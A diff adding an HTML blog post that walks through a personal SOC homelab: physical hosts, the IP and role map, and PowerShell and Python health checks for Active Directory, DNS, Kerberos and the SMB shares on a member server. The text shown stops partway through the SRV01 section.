@@ -1,0 +1,2242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>Homelab Walkthrough | purplepyram1d</title>
+<meta name="description" content="A walkthrough of my eleven-system SOC homelab, from physical hosts and Active Directory to Wazuh, Velociraptor, Splunk, Sliver, and LabWatch incident response.">
+<meta name="author" content="Johnny Meintel">
+<link rel="icon" href="../../assets/images/logo-pyramid.png">
+<link rel="stylesheet" href="../../assets/css/site.css?v=2026090901">
+
+<link rel="canonical" href="https://purplepyram1d.github.io/blog/posts/homelab-walkthrough-9-8-26.html">
+
+<meta property="og:title" content="Homelab Walkthrough">
+<meta property="og:description" content="A walkthrough of my eleven-system SOC homelab, from physical hosts and Active Directory to Wazuh, Velociraptor, Splunk, Sliver, and LabWatch incident response.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="https://purplepyram1d.github.io/assets/images/homelab-walkthrough/00-Homelab.png">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<div class="wrap">
+
+  <header class="masthead compact">
+    <div class="mast-row">
+      <div>
+        <a href="../../index.html"><h1 class="title sm">purplepyram<span class="dim">1</span>d</h1></a>
+      </div>
+      <nav class="mast-nav" aria-label="Primary">
+        <a href="../../index.html">Contents</a>
+        <a href="../index.html">Writing</a>
+        <a href="../../rooted.html">Log</a>
+        <a href="https://github.com/purplepyram1d">GitHub</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="main" style="margin-top:2.5rem;">
+  <div class="grid">
+    <div class="rail"><span>2026-09-08</span><span class="em">Homelab</span><span>~47 min</span></div>
+    <article>
+      <h1>Homelab Walkthrough</h1>
+      <div class="art-meta">Johnny Meintel &middot; 2026-09-08 &middot; SOC homelab and detection engineering</div>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/00-Homelab.png" alt="My SOC homelab, with the defensive workstation, enterprise consoles, and adversary laptop." width="1266" height="458" fetchpriority="high">
+<figcaption><span class="lab">Fig 1.</span> My SOC homelab, with the defensive workstation, enterprise consoles, and adversary laptop.</figcaption>
+</figure>
+
+
+<p>This is a walkthrough of my SOC homelab: two inexpensive desktop PCs, my old laptop, a TP-Link switch, two external drives, and five monitors. This self-built environment gives me more control and visibility than preconfigured online labs. In addition to practicing attack and defense, I can study the systems, dependencies, and telemetry that make each scenario possible.</p>
+<p><strong>Estate map</strong></p>
+<div class="table-scroll" tabindex="0" role="region" aria-label="Scrollable reference table">
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>IP</th>
+<th>Role in one word</th>
+<th>OS</th>
+<th>Domain role</th>
+<th>Wazuh ID</th>
+<th>Velociraptor client</th>
+<th>SSH account</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CORP</td>
+<td>10.10.10.10</td>
+<td>Console</td>
+<td>Windows 11 Pro</td>
+<td>Standalone (workgroup)</td>
+<td>n/a (host)</td>
+<td>n/a</td>
+<td>local session</td>
+</tr>
+<tr>
+<td>BLUETEAM</td>
+<td>10.10.10.20</td>
+<td>Hypervisor (defense)</td>
+<td>Windows 11 Pro</td>
+<td>Standalone (workgroup)</td>
+<td>n/a (host)</td>
+<td>n/a</td>
+<td><code>blueteam_admin</code></td>
+</tr>
+<tr>
+<td>Windows laptop</td>
+<td>10.10.10.40</td>
+<td>Hypervisor (adversary)</td>
+<td>Windows 11</td>
+<td>Standalone (workgroup)</td>
+<td>n/a (host)</td>
+<td>n/a</td>
+<td>local console; SSH absent</td>
+</tr>
+<tr>
+<td>DC01</td>
+<td>10.10.10.11</td>
+<td>Identity</td>
+<td>Server 2022</td>
+<td>Primary Domain Controller</td>
+<td>001</td>
+<td><code>C.213b6d359ae5a1ca</code></td>
+<td><code>Administrator</code> (bare)</td>
+</tr>
+<tr>
+<td>SRV01</td>
+<td>10.10.10.12</td>
+<td>Services</td>
+<td>Server 2022</td>
+<td>Member Server</td>
+<td>003</td>
+<td><code>C.177f8ab1390cfc00</code></td>
+<td><code>CORP\Administrator</code></td>
+</tr>
+<tr>
+<td>WS01</td>
+<td>10.10.10.21</td>
+<td>Endpoint</td>
+<td>Windows 11 Ent</td>
+<td>Member Workstation</td>
+<td>002</td>
+<td><code>C.5fe9a6e786e4687d</code></td>
+<td><code>CORP\Administrator</code></td>
+</tr>
+<tr>
+<td>WS02</td>
+<td>10.10.10.22</td>
+<td>Endpoint</td>
+<td>Windows 11 Ent</td>
+<td>Member Workstation</td>
+<td>004</td>
+<td><code>C.e07d49d200b14e75</code></td>
+<td><code>CORP\Administrator</code></td>
+</tr>
+<tr>
+<td>SIEM01</td>
+<td>10.10.10.5</td>
+<td>Detection</td>
+<td>Ubuntu 26.04</td>
+<td>n/a (Linux)</td>
+<td>000</td>
+<td>server</td>
+<td><code>root</code></td>
+</tr>
+<tr>
+<td>SIEM02</td>
+<td>10.10.10.6</td>
+<td>Decision</td>
+<td>Ubuntu 26.04</td>
+<td>n/a (Linux)</td>
+<td>005</td>
+<td><code>C.1f5481f7eebcb77b</code></td>
+<td><code>root</code></td>
+</tr>
+<tr>
+<td>KALI</td>
+<td>10.10.10.30</td>
+<td>Adversary</td>
+<td>Kali Rolling</td>
+<td>n/a (Linux)</td>
+<td>none (by design)</td>
+<td>none (by design)</td>
+<td><code>red_admin</code></td>
+</tr>
+<tr>
+<td>C2-01</td>
+<td>10.10.10.31</td>
+<td>C2 server</td>
+<td>Ubuntu 26.04</td>
+<td>n/a (Linux)</td>
+<td>none (by design)</td>
+<td>none (by design)</td>
+<td><code>root</code></td>
+</tr>
+</tbody></table>
+</div>
+<h2>CORP</h2>
+<h3>Host identity and capacity</h3>
+<p>CORP is a Dell OptiPlex purchased on eBay for $325. Its 32 GB of RAM is enough to run four VMs: DC01, SRV01, WS01, and WS02. Together, those VMs form the simulated enterprise network. A USB hard drive provides shared storage for the lab, and an additional external SSD stores the VM files.</p>
+<pre><code class="language-powershell"># Print the local computer name.
+hostname
+
+# Report the operating-system version and architecture.
+Get-CimInstance Win32_OperatingSystem |
+    Select-Object Caption, Version, BuildNumber, OSArchitecture
+
+# Report the host identity, domain role, hardware model, and installed RAM.
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object Name, Domain, DomainRole, Manufacturer, Model, @{N=&#39;RAM_GB&#39;;E={[math]::Round($_.TotalPhysicalMemory / 1GB)}}
+
+# Report the label and remaining space on the external E: volume.
+Get-Volume -DriveLetter E |
+    Select-Object DriveLetter, FileSystemLabel, @{N=&#39;FreeGB&#39;;E={[math]::Round($_.SizeRemaining / 1GB, 1)}}
+</code></pre>
+<pre><code class="language-plaintext">CORP
+
+
+Caption                  Version    BuildNumber OSArchitecture
+-------                  -------    ----------- --------------
+Microsoft Windows 11 Pro 10.0.26200 26200       64-bit
+
+
+Name         : CORP
+Domain       : WORKGROUP
+DomainRole   : 0
+Manufacturer : Dell Inc.
+Model        : OptiPlex 7050
+RAM_GB       : 32
+
+
+DriveLetter FileSystemLabel  FreeGB
+----------- ---------------  ------
+E           Elements        1135.50
+</code></pre>
+<h3>Estate reachability</h3>
+<p>CORP is the primary console, where I do most of my work. A <code>DomainRole</code> value of <code>0</code> confirms that the physical host is not domain-joined. This is by design to separate it from the attack surface. I have a PowerShell script that fetches the hostname from every other device in the lab over SSH to test connectivity:</p>
+<pre><code class="language-powershell"># Add spacing before the reachability results.
+Write-Host &quot;&quot;
+
+# Map each static address to the SSH account expected on that host.
+$SshTargets = [ordered]@{
+    &#39;10.10.10.5&#39;  = &#39;blue_admin&#39;       # SIEM01
+    &#39;10.10.10.6&#39;  = &#39;root&#39;             # SIEM02
+    &#39;10.10.10.11&#39; = &#39;Administrator&#39;    # DC01
+    &#39;10.10.10.12&#39; = &#39;CORP\Administrator&#39; # SRV01
+    &#39;10.10.10.20&#39; = &#39;blueteam_admin&#39;   # BLUETEAM
+    &#39;10.10.10.21&#39; = &#39;CORP\Administrator&#39; # WS01
+    &#39;10.10.10.22&#39; = &#39;CORP\Administrator&#39; # WS02
+    &#39;10.10.10.30&#39; = &#39;red_admin&#39;        # KALI
+    &#39;10.10.10.31&#39; = &#39;root&#39;             # C2-01
+    &#39;10.10.10.40&#39; = &#39;redteam_admin&#39;    # ATTACKBOX
+}
+
+# Test noninteractive SSH access and print the hostname returned by each target.
+$SshTargets.GetEnumerator() | ForEach-Object {
+    # Print the current IP without ending the line.
+    Write-Host (&quot;{0,-14} -&gt; &quot; -f $_.Key) -NoNewline
+    # Fail quickly if key-based authentication or network access is unavailable.
+    ssh -o BatchMode=yes -o ConnectTimeout=8 &quot;$($_.Value)@$($_.Key)&quot; hostname 2&gt;&amp;1 |
+        Select-Object -Last 1
+}
+
+# Add spacing after the results.
+Write-Host &quot;&quot;
+</code></pre>
+<p>As a second check, this Python script pings every lab device by IP address and writes a persistent reachability snapshot:</p>
+<pre><code class="language-python"># Import timestamp support for the report header.
+import datetime
+# Import pathlib for reliable Windows path handling.
+import pathlib
+# Import subprocess so the script can call the Windows ping utility.
+import subprocess
+
+# Map canonical lab hostnames to their static IP addresses.
+hosts = {
+    &quot;SIEM01&quot;: &quot;10.10.10.5&quot;,   # Wazuh and Velociraptor
+    &quot;SIEM02&quot;: &quot;10.10.10.6&quot;,   # Splunk
+    &quot;CORP&quot;: &quot;10.10.10.10&quot;,    # Operator console
+    &quot;DC01&quot;: &quot;10.10.10.11&quot;,    # Domain controller and DNS
+    &quot;SRV01&quot;: &quot;10.10.10.12&quot;,   # Application server
+    &quot;BLUETEAM&quot;: &quot;10.10.10.20&quot;,# Defensive hypervisor
+    &quot;WS01&quot;: &quot;10.10.10.21&quot;,    # Workstation one
+    &quot;WS02&quot;: &quot;10.10.10.22&quot;,    # Workstation two
+    &quot;KALI&quot;: &quot;10.10.10.30&quot;,    # Attacker VM
+    &quot;C2-01&quot;: &quot;10.10.10.31&quot;,   # Command-and-control VM
+    &quot;LAPTOP&quot;: &quot;10.10.10.40&quot;,  # Offensive hypervisor
+}
+
+# Keep the reachability report on persistent external storage.
+out = pathlib.Path(r&quot;E:\01 Scripts\02 Health Checks\Estate-Reachability.txt&quot;)
+# Create the output directory if it does not already exist.
+out.parent.mkdir(parents=True, exist_ok=True)
+# Start the report with the local collection time.
+lines = [f&quot;estate reachability {datetime.datetime.now():%Y-%m-%d %H:%M}&quot;]
+
+# Test every mapped host once.
+for name, ip in hosts.items():
+    # Wait no more than 800 milliseconds for the single echo reply.
+    result = subprocess.run(
+        [&quot;ping&quot;, &quot;-n&quot;, &quot;1&quot;, &quot;-w&quot;, &quot;800&quot;, ip],
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    # Translate the ping exit code into a compact status line.
+    status = &quot;UP&quot; if result.returncode == 0 else &quot;DOWN&quot;
+    # Preserve the hostname, address, and status in aligned columns.
+    lines.append(f&quot;{name:&lt;10}{ip:&lt;14}{status}&quot;)
+
+# Write the complete snapshot as UTF-8 text.
+out.write_text(&quot;\n&quot;.join(lines) + &quot;\n&quot;, encoding=&quot;utf-8&quot;)
+# Print the same snapshot for immediate review.
+print(&quot;\n&quot; + out.read_text(encoding=&quot;utf-8&quot;))
+</code></pre>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/01-CORP-Reachability.png" alt="Estate reachability checks from CORP." width="912" height="632" loading="lazy">
+<figcaption><span class="lab">Fig 2.</span> Estate reachability checks from CORP.</figcaption>
+</figure>
+
+
+<hr>
+<p>The operator console is healthy and can reach the estate. The next two sections document the physical systems that host the defensive and offensive VMs.</p>
+<h2>BLUETEAM</h2>
+<h3>Defensive hypervisor</h3>
+<p>BLUETEAM is another Dell OptiPlex with 32 GB of RAM, purchased on eBay for $325 and configured like CORP. It hosts SIEM01 (Wazuh and Velociraptor) and SIEM02 (Splunk), so it serves as the defensive workstation. It is intentionally outside the AD domain. An external SSD is still on the shopping list because these inexpensive OptiPlex systems include only 250 GB of internal storage.</p>
+<pre><code class="language-powershell"># Print the local hostname and operating-system build.
+hostname
+Get-CimInstance Win32_OperatingSystem |
+    Select-Object Caption, BuildNumber
+
+# List every VMware virtual machine currently running on this hypervisor.
+&amp; &#39;C:\Program Files\VMware\VMware Workstation\vmrun.exe&#39; list
+
+# Report free system-drive capacity and total physical RAM.
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object @{N=&#39;FreeC_GB&#39;;E={[math]::Round((Get-Volume -DriveLetter C).SizeRemaining / 1GB, 1)}}, @{N=&#39;RAM_GB&#39;;E={[math]::Round($_.TotalPhysicalMemory / 1GB)}}
+</code></pre>
+<pre><code class="language-plaintext">BLUETEAM
+
+
+Caption                  BuildNumber
+-------                  -----------
+Microsoft Windows 11 Pro 26200
+
+
+Total running VMs: 2
+C:\Virtual Machines\SIEM01\SIEM01.vmx
+C:\Virtual Machines\SIEM02\SIEM02.vmx
+</code></pre>
+<hr>
+<h2>ATTACKBOX</h2>
+<h3>Offensive hypervisor</h3>
+<p>My old laptop is the third physical host. It runs the Kali attacker VM and an additional Ubuntu command-and-control server, making it the offensive operator workstation.</p>
+<pre><code class="language-powershell"># Print the offensive hypervisor&#39;s hostname.
+hostname
+
+# Confirm that the lab-facing adapter owns the expected static address.
+Get-NetIPAddress -AddressFamily IPv4 |
+    Where-Object IPAddress -eq &#39;10.10.10.40&#39;
+
+# List every VMware virtual machine currently running on this hypervisor.
+&amp; &#39;C:\Program Files\VMware\VMware Workstation\vmrun.exe&#39; list
+</code></pre>
+<pre><code class="language-plaintext">AttackBox
+
+
+IPAddress         : 10.10.10.40
+InterfaceIndex    : 9
+InterfaceAlias    : Ethernet
+AddressFamily     : IPv4
+Type              : Unicast
+PrefixLength      : 24
+PrefixOrigin      : Manual
+SuffixOrigin      : Manual
+AddressState      : Preferred
+ValidLifetime     : Infinite ([TimeSpan]::MaxValue)
+PreferredLifetime : Infinite ([TimeSpan]::MaxValue)
+SkipAsSource      : False
+PolicyStore       : ActiveStore
+
+
+Total running VMs: 2
+C:\Lab\VMs\KALI\KALI.vmx
+C:\Lab\VMs\c2-01\c2-01.vmx
+</code></pre>
+<hr>
+<p>With the physical layer established, I can validate the core services that make the simulated enterprise function. Identity and name resolution come first because nearly every later test depends on them.</p>
+<h2>DC01</h2>
+<h3>Identity and directory health</h3>
+<p>With the physical hosts documented, the walkthrough moves to the first VM: DC01. The domain controller is the estate&#39;s identity authority. It holds the directory accounts and runs the DNS service that lab systems use to locate one another. The command below shows the <code>corp.local</code> domain and a <code>DomainRole</code> value of <code>5</code>, which identifies the system as a primary domain controller.</p>
+<ul>
+<li>0=Standalone Workstation</li>
+<li>1=Member Workstation</li>
+<li>2=Standalone Server</li>
+<li>3=Member Server</li>
+<li>4=Backup Domain Controller</li>
+<li><strong>5=Primary Domain Controller</strong></li>
+</ul>
+<pre><code class="language-powershell"># Print the hostname and confirm the machine&#39;s domain membership and role.
+hostname
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object Name, Domain, DomainRole
+</code></pre>
+<pre><code class="language-plaintext">DC01
+
+Name Domain     DomainRole
+---- ------     ----------
+DC01 corp.local          5
+</code></pre>
+<p>The command above queries the local machine&#39;s view of itself. The commands below query Active Directory and the services that support it:</p>
+<pre><code class="language-powershell"># Read the domain identity, functional level, and PDC emulator from Active Directory.
+Get-ADDomain |
+    Select-Object DNSRoot, NetBIOSName, DomainMode, PDCEmulator
+
+# Confirm that the directory, DNS, Kerberos, logon, and time services are running.
+Get-Service NTDS, DNS, KDC, Netlogon, W32Time |
+    Select-Object Name, Status
+</code></pre>
+<pre><code class="language-plaintext">DNSRoot    NetBIOSName        DomainMode PDCEmulator
+-------    -----------        ---------- -----------
+corp.local CORP        Windows2016Domain DC01.corp.local
+
+
+Name      Status
+----      ------
+DNS      Running
+KDC      Running
+Netlogon Running
+NTDS     Running
+W32Time  Running
+</code></pre>
+<ul>
+<li><strong>DNSRoot:</strong> The fully qualified domain name (e.g., corp.example.com).</li>
+<li><strong>NetBIOSName:</strong> The legacy, short domain name (e.g., CORP).</li>
+<li><strong>DomainMode:</strong> The functional level of the domain, which dictates supported features and legacy compatibility.</li>
+<li><strong>PDCEmulator:</strong> Identifies the Domain Controller holding the Primary Domain Controller Emulator FSMO role. This server handles time synchronization and password changes.</li>
+<li><strong>NTDS:</strong> Active Directory Domain Services, the core directory database.</li>
+<li><strong>DNS:</strong> Domain Name System, essential for locating AD resources.</li>
+<li><strong>KDC:</strong> Key Distribution Center, the backbone of Kerberos authentication.</li>
+<li><strong>Netlogon:</strong> Maintains the secure channel between computers and the domain controller.</li>
+<li><strong>W32Time:</strong> Windows Time Service, which keeps clocks within Kerberos&#39;s allowed skew so ticket validation can succeed. Ticket lifetimes and other Kerberos controls constrain replay; time synchronization alone does not prevent replay.</li>
+</ul>
+<p>Next, I use the standard DC health command to check network connectivity, service health, DNS registration, SYSVOL availability, replication integrity, machine account status, and FSMO role placement. The <code>/q</code> flag prints only reported failures, so an empty result means this run found no failures. It does not replace logs, replication monitoring, or application-level tests.</p>
+<pre><code class="language-powershell"># Run the domain-controller diagnostic suite and display only failures.
+dcdiag /q
+</code></pre>
+<pre><code class="language-plaintext">[empty]
+</code></pre>
+<h3>DNS validation</h3>
+<p>The required services are running. I now query them directly, beginning with an A-record lookup that proves DC01 answers for the <code>corp.local</code> zone:</p>
+<pre><code class="language-powershell"># Resolve SRV01&#39;s A record by querying DC01 directly.
+Resolve-DnsName srv01.corp.local -Server 10.10.10.11 |
+    Format-List
+</code></pre>
+<pre><code class="language-plaintext">Name       : srv01.corp.local
+Type       : A
+TTL        : 3600
+DataLength : 4
+Section    : Answer
+IPAddress  : 10.10.10.12
+</code></pre>
+<p>hMailServer runs on SRV01, while DC01 hosts the MX record that directs mail clients to it:</p>
+<pre><code class="language-powershell"># Resolve the FakeCorp mail exchanger and its accompanying address record through DC01.
+Resolve-DnsName fakecorp.local -Type MX -Server 10.10.10.11 |
+    Format-List
+</code></pre>
+<pre><code class="language-plaintext">Name         : fakecorp.local
+Type         : MX
+TTL          : 3600
+NameExchange : mail.fakecorp.local
+Preference   : 10
+
+
+Name       : mail.fakecorp.local
+QueryType  : A
+TTL        : 3600
+Section    : Additional
+IP4Address : 10.10.10.12
+</code></pre>
+<p>An MX record names a mail host rather than an IP address. Here, the answer identifies <code>mail.fakecorp.local</code>, and the response&#39;s Additional section supplies its A record, <code>10.10.10.12</code>. Including that related address can save the client from making a separate lookup, although clients must still handle responses in which no Additional record is present.</p>
+<p>After resolving SRV01 by hostname, I run reverse (PTR) lookups to confirm that the selected IP addresses map back to the expected hostnames:</p>
+<pre><code class="language-powershell"># Submit the selected endpoint and server addresses for reverse-DNS resolution through DC01.
+&quot;10.10.10.22&quot;, &quot;10.10.10.21&quot;, &quot;10.10.10.12&quot; |
+    Resolve-DnsName -Server 10.10.10.11 |
+    Format-List
+</code></pre>
+<pre><code class="language-plaintext">Name     : 22.10.10.10.in-addr.arpa
+Type     : PTR
+TTL      : 1200
+Section  : Answer
+NameHost : WS02.corp.local
+
+
+Name     : 21.10.10.10.in-addr.arpa
+Type     : PTR
+TTL      : 1200
+Section  : Answer
+NameHost : WS01.corp.local
+
+
+Name     : 12.10.10.10.in-addr.arpa
+Type     : PTR
+TTL      : 3600
+Section  : Answer
+NameHost : srv01.corp.local
+</code></pre>
+<p><em>Why does the last octet of the IP address appear first?</em></p>
+<pre><code class="language-plaintext">srv01.corp.local
+└── local          ← top-level
+    └── corp       ← second-level
+        └── srv01  ← host
+
+10.10.10.12
+└── 10           ← most significant (network)
+    └── 10
+        └── 10
+            └── 12  ← least significant (host)
+</code></pre>
+<p>To make IP addresses fit the same DNS hierarchy model, the IETF decided to reverse the order of the octets and put them under the special domain in-addr.arpa. By reversing the octets, the most significant part of the IP (the network) ends up on the right side of the name, exactly where DNS expects the higher-level domains.</p>
+<div class="table-scroll" tabindex="0" role="region" aria-label="Scrollable reference table">
+<table>
+<thead>
+<tr>
+<th>Real IP address</th>
+<th>Reverse DNS name</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>10.10.10.12</td>
+<td><strong>12.10.10.10</strong>.in-addr.arpa</td>
+</tr>
+<tr>
+<td>10.10.10.21</td>
+<td><strong>21.10.10.10</strong>.in-addr.arpa</td>
+</tr>
+<tr>
+<td>10.10.10.22</td>
+<td><strong>22.10.10.10</strong>.in-addr.arpa</td>
+</tr>
+</tbody></table>
+</div>
+<p>Next, I retrieve DNS query statistics from the domain controller:</p>
+<pre><code class="language-powershell"># Expand DC01&#39;s cumulative DNS query counters for transport-level review.
+Get-DnsServerStatistics |
+    Select-Object -ExpandProperty QueryStatistics
+</code></pre>
+<pre><code class="language-plaintext">TcpClientConnections : 137
+TcpQueries           : 126
+TcpQueriesSent       : 0
+TcpResponses         : 103
+TcpResponsesReceived : 0
+UdpQueries           : 64236
+UdpQueriesSent       : 17662
+UdpResponses         : 59273
+UdpResponsesReceived : 16430
+PSComputerName       :
+</code></pre>
+<p>UDP handles most ordinary DNS queries without establishing a connection. DNS uses TCP when a UDP response is truncated or otherwise cannot carry the complete answer, and for operations such as zone transfers. That difference explains why the recorded TCP counters are much lower than the UDP counters.</p>
+<h3>Directory inventory</h3>
+<p>The next query inventories the user accounts currently stored in the directory:</p>
+<pre><code class="language-powershell"># List all directory users with their enabled state, sorted by logon name.
+Get-ADUser -Filter * |
+    Select-Object SamAccountName, Enabled |
+    Sort-Object SamAccountName
+</code></pre>
+<pre><code class="language-plaintext">SamAccountName Enabled
+-------------- -------
+Administrator     True
+avery.patel      False
+codex_agent       True
+eli.brooks       False
+Guest            False
+krbtgt           False
+labadmin2         True
+maya.chen        False
+nora.williams    False
+TEST_USER1        True
+TEST_USER2        True
+TEST_USER3        True
+WS02_User         True
+</code></pre>
+<p>The directory contains mostly test users that I enable and disable for specific lab work, along with the disabled <code>krbtgt</code> and default <code>Guest</code> accounts. Most administrative work in this isolated lab takes place through <code>Administrator</code>.</p>
+<p>I then list the computer accounts joined to the domain:</p>
+<pre><code class="language-powershell"># List all domain computer accounts and their registered DNS hostnames.
+Get-ADComputer -Filter * |
+    Select-Object Name, DNSHostName
+</code></pre>
+<pre><code class="language-plaintext">Name  DNSHostName
+----  -----------
+DC01  DC01.corp.local
+SRV01 SRV01.corp.local
+WS01  WS01.corp.local
+WS02  WS02.corp.local
+</code></pre>
+<h3>Kerberos authentication path</h3>
+<p>The DNS and directory results match the estate map. From SRV01, I now test the Kerberos path to DC01:</p>
+<pre><code class="language-powershell"># Run these commands from a domain-joined SRV01 session.
+# Remove cached Kerberos tickets for the current logon session.
+klist purge
+
+# Access SYSVOL to request the required Kerberos tickets, then display the refreshed cache.
+Get-ChildItem \\dc01.corp.local\sysvol | Out-Null
+klist
+</code></pre>
+<p>This clears the current logon session&#39;s Kerberos cache. Accessing <code>SYSVOL</code> then causes Windows to obtain the tickets needed for that SMB path, including a TGT when one is not already cached and a service ticket for <code>cifs/dc01</code>.</p>
+<pre><code class="language-plaintext">The `klist` output below records the logon session&#39;s cached ticket-granting ticket (TGT) and service tickets:
+
+
+Current LogonId is 0:0x1168bb5
+Cached Tickets: (3)
+
+
+#0&gt; Client: Administrator @ CORP.LOCAL
+Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
+KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize
+Start Time: 9/8/2026 12:51:34 (local)
+End Time:   9/8/2026 22:51:34 (local)
+Renew Time: 9/15/2026 12:51:34 (local)
+Session Key Type: AES-256-CTS-HMAC-SHA1-96
+Cache Flags: 0x2 -&gt; DELEGATION
+Kdc Called: DC01.corp.local
+
+
+#1&gt; Client: Administrator @ CORP.LOCAL
+Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
+KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
+Start Time: 9/8/2026 12:51:34 (local)
+End Time:   9/8/2026 22:51:34 (local)
+Renew Time: 9/15/2026 12:51:34 (local)
+Session Key Type: AES-256-CTS-HMAC-SHA1-96
+Cache Flags: 0x1 -&gt; PRIMARY
+Kdc Called: DC01.corp.local
+
+
+#2&gt; Client: Administrator @ CORP.LOCAL
+Server: cifs/dc01.corp.local @ CORP.LOCAL
+KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize
+Start Time: 9/8/2026 12:51:34 (local)
+End Time:   9/8/2026 22:51:34 (local)
+Renew Time: 9/15/2026 12:51:34 (local)
+Session Key Type: AES-256-CTS-HMAC-SHA1-96
+Cache Flags: 0
+Kdc Called: DC01.corp.local
+</code></pre>
+<h3>Client-side discovery and telemetry</h3>
+<p>This Python script parses the SRV record that domain-joined machines use to locate a domain controller:</p>
+<pre><code class="language-python"># Import regular-expression matching for the nslookup response.
+import re
+# Import pathlib so the raw response can be written safely.
+import pathlib
+# Import subprocess so Python can execute nslookup.
+import subprocess
+
+# Query the AD domain-controller locator record through DC01.
+result = subprocess.run(
+    [&quot;nslookup&quot;, &quot;-type=SRV&quot;, &quot;_ldap._tcp.dc._msdcs.corp.local&quot;, &quot;10.10.10.11&quot;],
+    capture_output=True,
+    text=True,
+    check=False,
+)
+# Stop with the command&#39;s diagnostic text if nslookup failed.
+if result.returncode != 0:
+    raise RuntimeError(result.stderr.strip() or &quot;nslookup failed without an error message&quot;)
+
+# Extract each advertised domain-controller hostname from the successful response.
+hosts = re.findall(r&quot;svr hostname\s*=\s*(\S+)&quot;, result.stdout, flags=re.IGNORECASE)
+# Display the parsed result while preserving a clear failure hint.
+print(&quot;DCs advertised via SRV:&quot;, hosts or &quot;(none found - check DNS)&quot;)
+
+# Keep the complete response as persistent evidence.
+output = pathlib.Path(r&quot;E:\01 Scripts\02 Health Checks\Host\dc-srv.txt&quot;)
+# Create the evidence directory if needed.
+output.parent.mkdir(parents=True, exist_ok=True)
+# Write the raw response without changing its content.
+output.write_text(result.stdout, encoding=&quot;utf-8&quot;)
+</code></pre>
+<pre><code class="language-plaintext">Server:  UnKnown
+Address:  10.10.10.11
+
+
+_ldap._tcp.dc._msdcs.corp.local SRV service location:
+priority       = 0
+weight         = 100
+port           = 389
+svr hostname   = dc01.corp.local
+dc01.corp.local internet address = 10.10.10.11
+</code></pre>
+<p>Finally, I check the defensive services installed on DC01:</p>
+<pre><code class="language-powershell"># Confirm that Sysmon, Wazuh, and Velociraptor are running on this host.
+Get-Service -Name @(&#39;Sysmon64&#39;, &#39;WazuhSvc&#39;, &#39;Velociraptor&#39;) |
+    Select-Object Name, Status
+</code></pre>
+<pre><code class="language-plaintext">Name          Status
+----          ------
+Sysmon64     Running
+Velociraptor Running
+WazuhSvc     Running
+</code></pre>
+<p>Sysmon records detailed endpoint activity. The Wazuh agent forwards selected event data to SIEM01, while the Velociraptor client provides a separate path for point-in-time host collection and process analysis.</p>
+<hr>
+<p>DC01 has now proved the estate&#39;s identity, DNS, and Kerberos foundations. SRV01 is the next dependency because it concentrates the lab&#39;s file, web, database, and mail workloads.</p>
+<h2>SRV01</h2>
+<h3>Host identity and application services</h3>
+<p>DC01 provides identity; SRV01 provides file shares, a web application, its supporting database, and a mail server. SRV01 is domain-joined but holds no directory role, which makes it a member server. It is also a major part of the lab&#39;s attack surface. The fictional FakeCorp portal is the controlled exfiltration target, and its mail server supports phishing exercises.</p>
+<p>Identity:</p>
+<pre><code class="language-powershell"># Print the hostname and confirm SRV01&#39;s domain membership and member-server role.
+hostname
+Get-CimInstance Win32_ComputerSystem |
+    Select-Object Name, Domain, DomainRole
+</code></pre>
+<pre><code class="language-plaintext">SRV01
+
+
+Name  Domain     DomainRole
+----  ------     ----------
+SRV01 corp.local          3
+</code></pre>
+<p>The three main application services are:</p>
+<pre><code class="language-powershell"># Confirm that IIS, MySQL, and hMailServer are running and set to start automatically.
+Get-Service W3SVC, MySQL97, hMailServer |
+    Select-Object Name, Status, StartType
+</code></pre>
+<pre><code class="language-plaintext">Name         Status StartType
+----         ------ ---------
+hMailServer Running Automatic
+MySQL97     Running Automatic
+W3SVC       Running Automatic
+</code></pre>
+<h3>File services</h3>
+<p>The SMB file shares:</p>
+<pre><code class="language-powershell"># List user-created SMB shares while excluding administrative shares that end in a dollar sign.
+Get-SmbShare |
+    Where-Object { $_.Name -notmatch &#39;\$$&#39; } |
+    Select-Object Name, Path
+</code></pre>
+<pre><code class="language-plaintext">Name      Path
+----      ----
+Finance   C:\Shares\Finance
+HR        C:\Shares\HR
+Radiology C:\Shares\Radiology
+</code></pre>
+<p><code>-notmatch &#39;\$$&#39;</code> is a regex: <code>\$</code> is a literal dollar sign and the trailing <code>$</code> anchors it to end-of-name, so this drops <code>C$</code>, <code>ADMIN$</code>, <code>IPC$</code>.</p>
+<p>I then enumerate the shares as a network client would see them, rather than relying only on local service state:</p>
+<pre><code class="language-powershell"># Enumerate the shares SRV01 exposes to a network client.
+net view \\SRV01
+</code></pre>
+<pre><code class="language-plaintext">Shared resources at \\SRV01
+
+Share name  Type  Used as  Comment
+
+Finance     Disk   x        x
+HR          Disk   x        x
+Radiology   Disk   x        x
+The command completed successfully.
+</code></pre>
+<p>To prove the share actually serves files, this PowerShell command quickly mounts, lists, and unmounts one:</p>
+<pre><code class="language-powershell"># Mount the Finance share temporarily, list its contents, and remove the temporary drive in all cases.
+New-PSDrive -Name S -PSProvider FileSystem -Root \\SRV01\Finance -ErrorAction Stop | Out-Null
+try {
+    # Prove the share serves directory content.
+    Get-ChildItem S:\
+}
+finally {
+    # Remove the temporary mapping even if enumeration fails.
+    Remove-PSDrive S -ErrorAction SilentlyContinue
+}
+</code></pre>
